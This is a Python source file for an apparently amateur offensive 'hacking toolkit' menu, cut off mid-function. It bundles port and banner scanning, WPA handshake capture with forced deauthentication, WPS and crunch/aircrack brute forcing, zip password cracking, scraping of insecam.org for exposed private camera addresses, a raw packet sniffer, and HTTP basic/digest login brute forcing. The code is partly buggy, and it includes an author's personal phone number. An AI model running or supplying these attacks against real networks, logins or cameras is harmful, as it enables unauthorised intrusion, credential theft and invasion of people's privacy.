import binascii
import ftplib
import hashlib
import smtplib
import socket
import struct
import optparse
import urllib
import zipfile
import itertools
import os
import subprocess
from subprocess import check_call
import re
from threading import Thread
import sys
import pexpect
import time
import getopt
from requests.auth import HTTPDigestAuth
import crypt
import requests as requests

print('''
            
                          :P@@@G.                                      .G@@@P:              
                       .?&@@&@@@&^                                    ^&@@@&@@&?.           
                     ^G@@#7  .#@@@J       .^!?YYJ?~::~?JYY?!^.       J@@@#.  7#@@G^         
                   !&@@&###BJ: ?@@@B. :JB&@@@@&###&@@&###&@@@@&BJ: .B@@@? .JB###&@@&7       
                 ?&@@@@@@@@@@@&5Y&@@@&@@@@B?.   J#GJJG#J   .?B@@@@&@@@&Y5&@@@@@@@@@@@&?     
               ~&@@@@@@@@B7?G@@@@@@@@@@@@@#J.    J@@@@J    .JB@@@@@@@@@@@@@G?7B@@@@@@@@&~   
              P@@@@@@@@@@!   .#@@@@@@@@G!.        Y@@Y        .!G@@@@@@@@#.   !@@@@@@@@@@P  
             ^@@@@@@@@@@@@5:5&@@@@@@G~         7P?7@@7?P7         ~G@@@@@@&5:Y@@@@@@@@@@@@^ 
              5@@@@@@@@@@@&@@@@@@&?.            J@@@@@@J            .?&@@@@@@&@@@@@@@@@@@5  
               .J#@@@@@@@@@@@@@B^     .5#5^      7@@@@7      ^5#5.     ^B@@@@@@@@@@@@@#J.   
                  .^7&@@@@@@@@B^  :75GB&@@@B:     @@@@     :B@@@&BG57:  ^B@@@@@@@@&7^.      
                    J@@@@@@@@Y.   :.^5@@&@@@@J   .@@@@.   J@@@@&@@5^.:   .Y@@@@@@@@J        
                  :&@@@@@@@Y.       .!@! ^@@@@&Y5&@@@@&5Y&@@@@^ ~@7.        Y@@@@@@@&:      
                 ?@@@@@@@G.           #B~:5@@@@@@@@@@@@@@@@@@5:~B#           .G@@@@@@@?     
                P@@@@@@@~              :!JG@@@@&G&@@@@&G&@@@@GJ!:              ~&@@@@@@P    
               B@@@@@@B.          :GYJJJP&@@@@G  .@@@@.  G@@@@&PJJJYG:           B@@@@@@B   
              B@@@@@@P             G@@@@@@@@@@~   !#&!   ^@@@@@@@@@@G             P@@@@@@B  
             5@@@@@@P               .~P@@@&P@@.           @@G&@@@P~                P@@@@@@5 
            ^@@@@@@# .5@~   .::::^^!YP&@@@~ @#            #@ !@@@&P?!~^::::.   ~@Y. #@@@@@@^
            #@@@@@@!5@@@.   .7G&@@@@@@@&@@  B5            5G .&@&@@@@@@@&B?.   .@@@5!@@@@@@#
            @GY@@@@@@@@@         ::.:. 7@P  ^.            .:  P@! ..::.        .@@@@@@@@@YG@
            . J@@@@@@@@@      :!7      &@~   .^!777!!777!^.   ~@&      7!:      @@@@@@@@@J .
              P@@@@@@@@@. .?B@@@^     P@@ .BBJ?7!!~~~~!!7?JBB. @@P     ^@@@B?. .@@@@@@@@@G  
              P@@@@@@@@@GP@@@@@?   ^5@@@G:@B :            : B@^G@@@5^   ?@@@@@PG@@@@@@@@@P  
              ?@@@@@@@@@@@@@@@@ .Y&@@@@@7?@G.&&.        .&&.G@?7@@@@@&Y. @@@@@@@@@@@@@@@@?  
              .@@@@@@@@@@@@@@@&J@@@@@@@@^ :G&&@5        5@&&G: ^@@@@@@@@J&@@@@@@@@@@@@@@@.  
               B@@@@@@@@@@@@@@@@@@@@@@@@5   .?GBGP5GGPPGBG?.   5@@@@@@@@@@@@@@@@@@@@@@@@B   
               .@@@@@@@@@@@@@@@@@@@@@@@@@&J.   7BGGBBGGB7   .J&@@@@@@@@@@@@@@@@@@@@@@@@@.   
                !@&?@@@@@@@@@@@@@@@@@@@@@@@@BYP@?      ?@PYB@@@@@@@@@@@@@@@@@@@@@@@@?&@7    
                 JY G@@@@@@@@@@@G@@@@@@@@@@@@&PP7:    :7PP&@@@@@@@@@@@@G@@@@@@@@@@@G JJ     
                     #@@@@@@@@@@B:!B@@@Y&@@@@B.          .B@@@@&Y@@@B!:B@@@@@@@@@@#         
                      G@@@@@@@@@@@!  ^J~ 7&@@@@@B!    !B@@@@@&7 ~J^  !@@@@@@@@@@@G          
                       7@@@@@@@@@@@&?.     :Y&@@@@@&&@@@@@&Y:     .?&@@@@@@@@@@@7           
                         Y@@@@@@@@@@@@B!.     .~5#@@@@#5~.     .!B@@@@@@@@@@@@Y             
                           7#@@&!#@@@@@@@#5GBJ^.   ::   .^JBG5#@@@@@@@&!&@@#7               
                             .!P^ ^G@@@@@@@@@@@@@&BGGB&@@@@@@@@@@@@@G^ ^P!.                 
                                     ~P&@@@@@@@@@@@@@@@@@@@@@@@@&P~                         
                                        :7G&@@&^P@@@@@@P^&@@&G7:                            
                                            .~J  .?&&?.  J~.
                                                        v1.0.0 by:Goatherd
                                                            
                                                            
╔─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
|                                                        MENU                                                         |
|─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────|
|                  [1] Scanner                             |                 [7] Flooder,Sniffer and Spoofer          |
|                                                          |                                                          |
|                  [2] Password-Generator                  |                 [8] Web Penetration Testing              |
|                                                          |                                                          |
|                  [3] Wifi-Hacking(Only Linux)            |                 [9] SSH / FTP                            |
|                                                          |                                                          |
|                  [4] zip-cracker                         |                 [10] Password Cracking                   |
|                                                          |                                                          |
|                  [5] hack-camera                         |                 [11] Help                                |
|                                                          |                                                          |
|                  [6] Network Analysis                    |                 [12] Exit                                |
|                                                          |                                                          |
┖─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┙                                
                                            ''')

choose = int(input("BlackBruin >> "))
#Scanner
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.setdefaulttimeout(2)


def portscanner(port):
    host = input("[*] Please Specify a Host to Scan >> ")
    if sock.connect_ex((host,port)):
        print("[-] Port %d is closed" % (port))
    else:
        print("[+] Port %d is open" % (port),)


def returnBanner(ip, port):
    try:
        socket.setdefaulttimeout(2)
        s = socket.socket()
        s.connect((ip,port))
        banner = s.recv(1024)
        return banner
    except:
        return

def main():
    ip = input("[*] Enter Target IP to Scan >> ")
    for port in range(1,100):
        banner = returnBanner(ip, port)
        if banner:
            print("[*]" + ip + ":" + str(port) + " - " + banner.strip('\n'))



if choose == 1:
    print('''
    [1] advanced Port Scanner
    [2] portScan
    [3] retrieveBanner
    [4] vulnerabilityScanner.py
    ''')
    scanner = int(input("BlackBruin >> "))
    if scanner == 1:
        print("Error")
    elif scanner == 2:
        for port in range(1, 1000):
            portscanner(port)
    elif scanner == 3:
        main()
    elif scanner == 4:
        print("Error")
elif choose == 2:
    scale = input('\033[36m[!] provide a size scale [eg: "4 to 8" = 4:8] : ')
    start = int(scale.split(':')[0])
    final = int(scale.split(':')[1])

    use_nouse = str(input("\n\033[36m[?] Do you want to enter personal data ? [y/N]: "))
    if use_nouse == 'y':
        first_name = str(input("\n\033[36m[*] Fist Name: "))
        last_name = str(input("\n\033[36m[*] Last Name: "))
        birthday = str(input("\n\033[36m[*] Birthday: "))
        month = str(input("\n\033[36m[*] Month: "))
        year = str(input("\n\033[36m[*] Year: "))
        chrs = first_name + last_name + birthday + month + year
    else:
        chrs = 'abcdefghijklmnopqrstuvwxyz'
        pass

    chrs_up = chrs.upper()
    chrs_specials = '!\][/?.,~-=";:><@#$%&*()_+\' '
    chrs_numerics = '1234567890'

    file_name = input('\n\033[36m[!] Insert a name for your wordlist file: ')
    arq = open(file_name, 'w')
    if input('\n\033[36m[?] Do you want to use uppercase characters? (y/n): ') == 'y':
        chrs = ''.join([chrs, chrs_up])
    if input('\n\033[36m[?] Do you want to use special characters? (y/n): ') == 'y':
        chrs = ''.join([chrs, chrs_specials])
    if input('\n\033[36m[?] Do you want to use numeric characters? (y/n): ') == 'y':
        chrs = ''.join([chrs, chrs_numerics])

    for i in range(start, final + 1):
        for j in itertools.product(chrs, repeat=i):
            temp = ''.join(j)
            print(temp)
            arq.write(temp + '\n')
    arq.close()
elif choose == 3:
    print("\nInstalling Needed Tools")
    print("\n")
    cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
    cmd = os.system("sleep 3 && clear")


    def intro():
        cmd = os.system("clear")
        print("""\033[1;32m
    ---------------------------------------------------------------------------------------
    ██╗    ██╗██╗███████╗██╗       ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
    ██║    ██║██║██╔════╝██║      ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
    ██║ █╗ ██║██║█████╗  ██║█████╗██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
    ██║███╗██║██║██╔══╝  ██║╚════╝██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
    ╚███╔███╔╝██║██║     ██║      ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝       ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                            Coded By BlackHatHacker-Ankit
    ---------------------------------------------------------------------------------------                                                                     
    (1)Start monitor mode       
    (2)Stop monitor mode                        
    (3)Scan Networks                            
    (4)Getting Handshake(monitor mode needed)   
    (5)Install Wireless tools                   
    (6)Crack Handshake with rockyou.txt (Handshake needed)
    (7)Crack Handshake with wordlist    (Handshake needed)
    (8)Crack Handshake without wordlist (Handshake,essid needed)
    (9)Create wordlist                                     
    (10)WPS Networks attacks (Bssid,monitor mode needed)
    (11)Scan for WPS Networks
    (0)About Me
    (00)Exit
    -----------------------------------------------------------------------
    """)
        print("\nEnter your choise here : !# ")
        var = int(input(""))
        if var == 1:
            print("\nEnter the interface:(Default(wlan0/wlan1))")
            interface = input("")
            order = "airmon-ng start {} && airmon-ng check kill".format(interface)
            geny = os.system(order)
            intro()
        elif var == 2:
            print("\nEnter the interface:(Default(wlan0mon/wlan1mon))")
            interface = input("")
            order = "airmon-ng stop {} && service network-manager restart".format(interface)
            geny = os.system(order)
            intro()
        elif var == 3:
            print("\nEnter the interface:(Default >> (wlan0mon/wlan1mon))")
            interface = input("")
            order = "airodump-ng {} -M".format(interface)
            print("When Done Press CTRL+c")
            cmd = os.system("sleep 3")
            geny = os.system(order)
            cmd = os.system("sleep 10")
            intro()
        elif var == 4:
            print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
            interface = input("")
            order = "airodump-ng {} -M".format(interface)
            print("\nWhen Done Press CTRL+c")
            print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
            print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
            print("\nyou Can use 's' to arrange networks")
            cmd = os.system("sleep 7")
            geny = os.system(order)
            print("\nEnter the bssid of the target?")
            bssid = str(input(""))
            print("\nEnter the channel of the network?")
            channel = int(input())
            print("Enter the path of the output file ?")
            path = str(input(""))
            print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
            print("the number of the packets Depends on the Distance Between you and the network")
            dist = int(input(""))
            order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,
                                                                                                         bssid, channel,
                                                                                                         path, dist,
                                                                                                         bssid,
                                                                                                         interface)
            geny = os.system(order)
            intro()
        elif var == 5:
            def wire():
                cmd = os.system("clear")
                print("""
    1) Aircrack-ng                          17) kalibrate-rtl
    2) Asleap                               18) KillerBee
    3) Bluelog                              19) Kismet
    4) BlueMaho                             20) mdk3
    5) Bluepot                              21) mfcuk
    6) BlueRanger                           22) mfoc
    7) Bluesnarfer                          23) mfterm
    8) Bully                                24) Multimon-NG
    9) coWPAtty                             25) PixieWPS
    10) crackle                             26) Reaver
    11) eapmd5pass                          27) redfang
    12) Fern Wifi Cracker                   28) RTLSDR Scanner
    13) Ghost Phisher                       29) Spooftooph
    14) GISKismet                           30) Wifi Honey
    15) Wifitap                             31) gr-scan
    16) Wifite                              32) Back to main menu
    90) airgeddon
    91) wifite v2
    0)install all wireless tools
    """)
                w = int(input("Enter The number of the tool : >>> "))
                if w == 1:
                    cmd = os.system("sudo apt-get update && apt-get install aircrack-ng")
                elif w == 90:
                    print(
                        "sudo apt-get update && apt-get install git && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git")
                elif w == 91:
                    print(
                        "sudo apt-get update && apt-get install git && git clone https://github.com/derv82/wifite2.git")
                elif w == 2:
                    cmd = os.system("sudo apt-get update && apt-get install asleep")
                elif w == 3:
                    cmd = os.system("sudo apt-get update && apt-get install bluelog")
                elif w == 4:
                    cmd = os.system("sudo apt-get update && apt-get install bluemaho")
                elif w == 5:
                    cmd = os.system("sudo apt-get update && apt-get install bluepot")
                elif w == 6:
                    cmd = os.system("sudo apt-get update && apt-get install blueranger")
                elif w == 7:
                    cmd = os.system("sudo apt-get update && apt-get install bluesnarfer")
                elif w == 8:
                    cmd = os.system("sudo apt-get update && apt-get install bully")
                elif w == 9:
                    cmd = os.system("sudo apt-get update && apt-get install cowpatty")
                elif w == 10:
                    cmd = os.system("sudo apt-get update && apt-get install crackle")
                elif w == 11:
                    cmd = os.system("sudo apt-get update && apt-get install eapmd5pass")
                elif w == 12:
                    cmd = os.system("sudo apt-get update && apt-get install fern-wifi-cracker")
                elif w == 13:
                    cmd = os.system("sudo apt-get update && apt-get install ghost-phisher")
                elif w == 14:
                    cmd = os.system("sudo apt-get update && apt-get install giskismet")
                elif w == 15:
                    cmd = os.system("apt-get install git && git clone git://git.kali.org/packages/gr-scan.git")
                elif w == 16:
                    cmd = os.system("sudo apt-get update && apt-get install kalibrate-rtl")
                elif w == 17:
                    cmd = os.system("sudo apt-get update && apt-get install killerbee-ng")
                elif w == 18:
                    cmd = os.system("sudo apt-get update && apt-get install kismet")
                elif w == 19:
                    cmd = os.system("sudo apt-get update && apt-get install mdk3")
                elif w == 20:
                    cmd = os.system("sudo apt-get update && apt-get install mfcuk")
                elif w == 21:
                    cmd = os.system("sudo apt-get update && apt-get install mfoc")
                elif w == 22:
                    cmd = os.system("sudo apt-get update && apt-get install mfterm")
                elif w == 23:
                    cmd = os.system("sudo apt-get update && apt-get install multimon-ng")
                elif w == 24:
                    cmd = os.system("sudo apt-get update && apt-get install pixiewps")
                elif w == 25:
                    cmd = os.system("sudo apt-get update && apt-get install reaver")
                elif w == 26:
                    cmd = os.system("sudo apt-get update && apt-get install redfang")
                elif w == 27:
                    cmd = os.system("sudo apt-get update && apt-get install rtlsdr-scanner")
                elif w == 28:
                    cmd = os.system("sudo apt-get update && apt-get install spooftooph")
                elif w == 29:
                    cmd = os.system("sudo apt-get update && apt-get install wifi-honey")
                elif w == 30:
                    cmd = os.system("sudo apt-get update && apt-get install wifitap")
                elif w == 31:
                    cmd = os.system("sudo apt-get update && apt-get install wifite")
                elif w == 32:
                    intro()
                elif w == 0:
                    cmd = os.system(
                        "apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite")
                else:
                    print("Not Found")
                wire()

            wire()
        elif var == 0:
            cmd = os.system("clear")
            print("""
    Hi.
    My Name is 4nk17, A Ethical Hacker,Bug Bounty Hunter,Currently Working as Cyber Security Researcher.
    you can find on Instagram
    https://www.instagram.com/ankit_kanojiya69/
    Contack me +919768367597
    Feel Free to Contact,
    """)
            quit()
        elif var == 00:
            exit()
        elif var == 6:
            if os.path.exists("/usr/share/wordlists/rockyou.txt") == True:
                print("\nEnter the path of the handshake file ?")
                path = str(input(""))
                order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
                print("\nTo exit Press CTRL +C")
                geny = os.system(order)
                sleep = os.system("sleep 5d")
                exit()
            elif os.path.exists("/usr/share/wordlists/rockyou.txt") == False:
                cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
                print("\nEnter the path of the handshake file ?")
                path = str(input(""))
                order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
                print("\nTo exit Press CTRL +C")
                geny = os.system(order)
                sleep = os.system("sleep 5d")
                exit()
        elif var == 7:
            print("\nEnter the path of the handshake file ?")
            path = str(input(""))
            print("\nEnter the path of the wordlist ?")
            wordlist = str(input(""))
            order = ("aircrack-ng {} -w {}").format(path, wordlist)
            geny = os.system(order)
            exit()
        elif var == 8:
            print("\nEnter the essid of the network ?(Be careful when you type it and use 'the name of the network') ")
            essid = str(input(""))
            print("\nEnter the path of the handshake file ?")
            path = str(input(""))
            print("\nEnter the minimum length of the password (8/64)?")
            mini = int(input(""))
            print("\nEnter the maximum length of the password (8/64)?")
            max = int(input(""))
            print("""
    ---------------------------------------------------------------------------------------
    (1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
    (2)  Uppercase chars                                 (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
    (3)  Numeric chars                                   (0123456789)
    (4)  Symbol chars                                    (!#$%/=?{}[]-*:;)
    (5)  Lowercase + uppercase chars                     (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
    (6)  Lowercase + numeric chars                       (abcdefghijklmnopqrstuvwxyz0123456789)
    (7)  Uppercase + numeric chars                       (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
    (8)  Symbol + numeric chars                          (!#$%/=?{}[]-*:;0123456789)
    (9)  Lowercase + uppercase + numeric chars           (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789) 
    (10) Lowercase + uppercase + symbol chars            (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
    (11) Lowercase + uppercase + numeric + symbol chars  (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
    (12) Your Own Words and numbers
    -----------------------------------------------------------------------------------------
    Crack Password Could Take Hours,Days,Weeks,Months to complete
    and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
    may reach to Hundreds of TeRa Bits so Be patiant
    """)
            print("\nEnter your choise here : ?")
            set = str(input(""))
            if set == "1":
                test = str("abcdefghijklmnopqrstuvwxyz")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "2":
                test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "3":
                test = str("0123456789")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "4":
                test = str("!#$%/=?{}[]-*:;")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "5":
                test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "6":
                test = str("abcdefghijklmnopqrstuvwxyz0123456789")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "7":
                test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "8":
                test = str("!#$%/=?{}[]-*:;0123456789")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "9":
                test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "10":
                test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "11":
                test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;")
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            elif set == "12":
                print("Enter you Own Words and numbers")
                test = str(input(""))
                order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini, max, test, path, essid)
                geny = os.system(order)
            else:
                print("\nNot Found")
                intro()
            print("Copy the Password and Close the tool")
            cmd5 = os.system("sleep 3d")
        elif var == 9:
            print("\nEnter the minimum length of the password (8/64)?")
            mini = int(input(""))
            print("\nEnter the maximum length of the password (8/64)?")
            max = int(input(""))
            print("\nEnter the path of the output file?")
            path = str(input(""))
            print("\nEnter what you want the password contain ?")
            password = str(input(""))
            order = ("crunch {} {} {} -o {}").format(mini, max, password, path)
            geny = os.system(order)
            a = ("The wordlist in >>>>> {} Named as SRART").format(path)
            print(a)
        elif var == 10:
            cmd = os.system("clear")
            print("""
    1)Reaver
    2)Bully
    3)wifite (Recommeneded)
    4)PixieWps
    0) Back to Main Menu
    """)
            print("Choose the kind of the attack(External WIFI Adapter Require) ?")
            attack = int(input(""))
            if attack == 1:
                print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))")
                interface = str(input(""))
                print("\nEnter the bssid of the network ?")
                bssid = str(input(""))
                order = ("reaver -i {} -b {} -vv").format(interface, bssid)
                geny = os.system(order)
                intro()
            elif attack == 2:
                print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
                interface = str(input(""))
                print("\nEnter the bssid of the network ?")
                bssid = str(input(""))
                print("\nEnter the channel of the network ?")
                channel = int(input(""))
                order = ("bully -b {} -c {} --pixiewps {}").format(bssid, channel, interface)
                geny = os.system(order)
                intro()
            elif attack == 3:
                cmd = os.system("wifite")
                intro()
            elif attack == 4:
                print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
                interface = str(input(""))
                print("\nEnter the bssid of the network ?")
                bssid = str(input(""))
                order = ("reaver -i {} -b {} -K").format(interface, bssid)
                geny = os.system(order)
                intro()
            elif attack == 0:
                intro()
        elif var == 11:
            print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon)")
            interface = str(input(""))
            order = "airodump-ng -M --wps {}".format(interface)
            geny = os.system(order)
            cmd = os.system("sleep 5 ")
            intro()
        else:
            print("Not Found")
            cmd = os.system("sleep 2")
            intro()
    intro()
elif choose == 4:
    file = str(input("Please inpute your zip file:"))
    wordlist1 = str(input("Please inpute your wordlist:"))


    def main():
        """
        Zipfile password cracker using a brute-force dictionary attack.
        """
        zipfilename = file
        dictionary = wordlist1

        password = None
        zip_file = zipfile.ZipFile(zipfilename)
        with open(dictionary, 'r') as f:
            for line in f.readlines():
                password = line.strip('\n')
                try:
                    zip_file.extractall(pwd=password)
                    password = 'Password found: %s' % password
                except:
                    pass
        print("Password:" + password)



    if __name__ == '__main__':
        main()

elif choose == 5:
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"}
    Country = input("Country:")
    req = requests.get(
        f"http://www.insecam.org/en/bycountry/{Country}", headers=headers
    )
    last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', req.text)[0]

    for page in range(int(last_page)):
        res = requests.get(
            f"http://www.insecam.org/en/bycountry/{Country}/?page={page}",
            headers=headers
        )
        find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
        for ip in find_ip:
            print(ip)

elif choose == 6:
    socketCreated = False
    socketSniffer = 0


    def analyzeUDPHeader(dataRecv):
        udpHeader = struct.unpack('!4H', dataRecv[:8])
        srcPort = udpHeader[0]
        dstPort = udpHeader[1]
        length = udpHeader[2]
        checksum = udpHeader[3]
        data = dataRecv[8:]

        print('---------- UDP HEADER ----------')
        print('Source Port: %hu' % srcPort)
        print('Destination Port: %hu' % dstPort)
        print('Length: %hu' % length)
        print('Checksum: %hu\n' % checksum)

        return data


    def analyzeTCPHeader(dataRecv):
        tcpHeader = struct.unpack('!2H2I4H', dataRecv[:20])
        srcPort = tcpHeader[0]
        dstPort = tcpHeader[1]
        seqNum = tcpHeader[2]
        ackNum = tcpHeader[3]
        offset = tcpHeader[4] >> 12
        reserved = (tcpHeader[5] >> 6) & 0x03ff
        flags = tcpHeader[4] & 0x003f
        window = tcpHeader[5]
        checksum = tcpHeader[6]
        urgPtr = tcpHeader[7]
        data = dataRecv[20:]

        urg = bool(flags & 0x0020)
        ack = bool(flags & 0x0010)
        psh = bool(flags & 0x0008)
        rst = bool(flags & 0x0004)
        syn = bool(flags & 0x0002)
        fin = bool(flags % 0x0001)

        print('---------- TCP HEADER ----------')
        print('Source Port: %hu' % srcPort)
        print('Destination Port: %hu' % dstPort)
        print('Sequence Number: %u' % seqNum)
        print('Acknowledgement: %u' % ackNum)
        print('Flags: ')
        print('    URG: %d | ACK: %d | PSH: %d | RST: %d | SYN: %d | FIN: %d' % (urg, ack, psh, rst, syn, fin))
        print('Window Size: %hu' % window)
        print('Checksum: %hu' % checksum)
        print('Urgent Pointer: %hu\n' % urgPtr)

        return data


    def analyzeIP(dataRecv):
        ipHeader = struct.unpack('!6H4s4s', dataRecv[:20])
        version = ipHeader[0] >> 12
        ihl = (ipHeader[0] >> 8) & 0x0f
        tos = ipHeader[0] & 0x00ff
        totalLength = ipHeader[1]
        ipID = ipHeader[2]
        flags = ipHeader[3] >> 13
        fragOffset = ipHeader[3] & 0x1fff
        ipTTL = ipHeader[4] >> 8
        ipProtocol = ipHeader[4] & 0x00ff
        checksum = ipHeader[5]
        srcAddr = socket.inet_ntoa(ipHeader[6])
        dstAddr = socket.inet_ntoa(ipHeader[7])
        data = dataRecv[20:]

        print('---------- IP HEADER ----------')
        print('Version: %hu' % version)
        print('IHL: %hu' % ihl)
        print('TOS: %hu' % tos)
        print('Length: %hu' % totalLength)
        print('ID: %hu' % ipID)
        print('Offset: %hu' % fragOffset)
        print('TTL: %hu' % ipTTL)
        print('Protocol: %hu' % ipProtocol)
        print('Checksum: %hu' % checksum)
        print('Source IP: %s' % srcAddr)
        print('Destination IP: %s\n' % dstAddr)

        if ipProtocol == 6:
            tcp_udp = "TCP"
        elif ipProtocol == 17:
            tcp_udp = "UDP"
        else:
            tcp_udp = "Other"

        return data, tcp_udp


    def analyzeEtherHeader(dataRecv):
        ipBool = False
        etherHeader = struct.unpack('!6s6sH', dataRecv[:14])
        dstMac = binascii.hexlify(etherHeader[0]).decode()
        srcMac = binascii.hexlify(etherHeader[1]).decode()
        protocol = etherHeader[2] >> 8
        data = dataRecv[14:]

        print('---------- ETHERNET HEADER -----------')
        print('Destination MAC: %s:%s:%s:%s:%s:%s' % (
        dstMac[0:2], dstMac[2:4], dstMac[4:6], dstMac[6:8], dstMac[8:10], dstMac[10:12]))
        print('Source MAC: %s:%s:%s:%s:%s:%s' % (
        srcMac[0:2], srcMac[2:4], srcMac[4:6], srcMac[6:8], srcMac[8:10], srcMac[10:12]))
        print('Protocol: %hu\n' % protocol)

        if protocol == 0x08:
            ipBool = True

        return data, ipBool


    def main():
        global socketCreated
        global socketSniffer

        if socketCreated == False:
            socketSniffer = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            socketCreated = True;

        dataRecv = socketSniffer.recv(2048)
        os.system('clear')

        dataRecv, ipBool = analyzeEtherHeader(dataRecv)

        if ipBool:
            dataRecv, tcp_udp = analyzeIP(dataRecv)
        else:
            return

        if tcp_udp == "TCP":
            dataRecv = analyzeTCPHeader(dataRecv)
        elif tcp_udp == "UDP":
            dataRecv = analyzeUDPHeader(dataRecv)
        else:
            return


    while True:
        main()

elif choose == 7:
    print("try again later")

elif choose == 8:
    print('''
    [1] BaseDigestAuth
    [2] Bruteforcer
    [3] directory Discover
    [4] gmail Bruteforce
    [5] Wifi-Stealer
    ''')
    pentestg = int(input("BlackBruin >> "))
    if pentestg == 1:
        global hit
        hit = "1"


        def banner():
            print('''        --------------------
                BASE OR DIGEST AUTH
                --------------------''')


        def usage():
            print(
                "Usage: -w <URL> -u <username> -t <number of threads> -f <dictionary file> -m <method (basic or digest)>")
            print(
                "Example: python3 baseDigestAuth.py -w http://randomsite.com -u admin -t 5 -f passwords.txt -m basic\n")


        class request_performer(Thread):
            def __init__(self, passwd, user, url, method):
                Thread.__init__(self)
                self.password = passwd.split("\n")[0]
                self.username = user
                self.url = url
                self.method = method
                print("-" + self.password + "-")

            def run(self):
                global hit

                if hit == "1":
                    try:
                        if self.method == "basic":
                            r = requests.get(self.url, auth=(self.user, self.password))
                        elif self.method == "digest":
                            r = requests.get(self.url, auth=HTTPDigestAuth(self.user, self.password))

                        if r.status_code == 200:
                            hit = "0"
                            print("[+] Password Found - " + self.password)
                            sys.exit()
                        else:
                            print("[-] Not Valid Password: " + self.password)
                            i[0] = i[0] - 1
                    except Exception as e:
                        print(e)


        def start(argv):
            banner()
            if len(sys.argv) < 5:
                usage()
                sys.exit()

            try:
                opts, args = getopt.getopt(argv, "u:w:f:m:t")
            except getopt.Getopterror:
                print("[-] Invalid Arguments")
                sys.exit()

            method = ""
            user = ""
            url = ""
            threads = 0
            for opt, arg in opts:
                if opt == '-u':
                    user = arg
                elif opt == '-t':
                    threads = arg
                elif opt == '-w':
                    url = arg
                elif opt == '-f':
                    dictionary = arg
                elif opt == '-m':
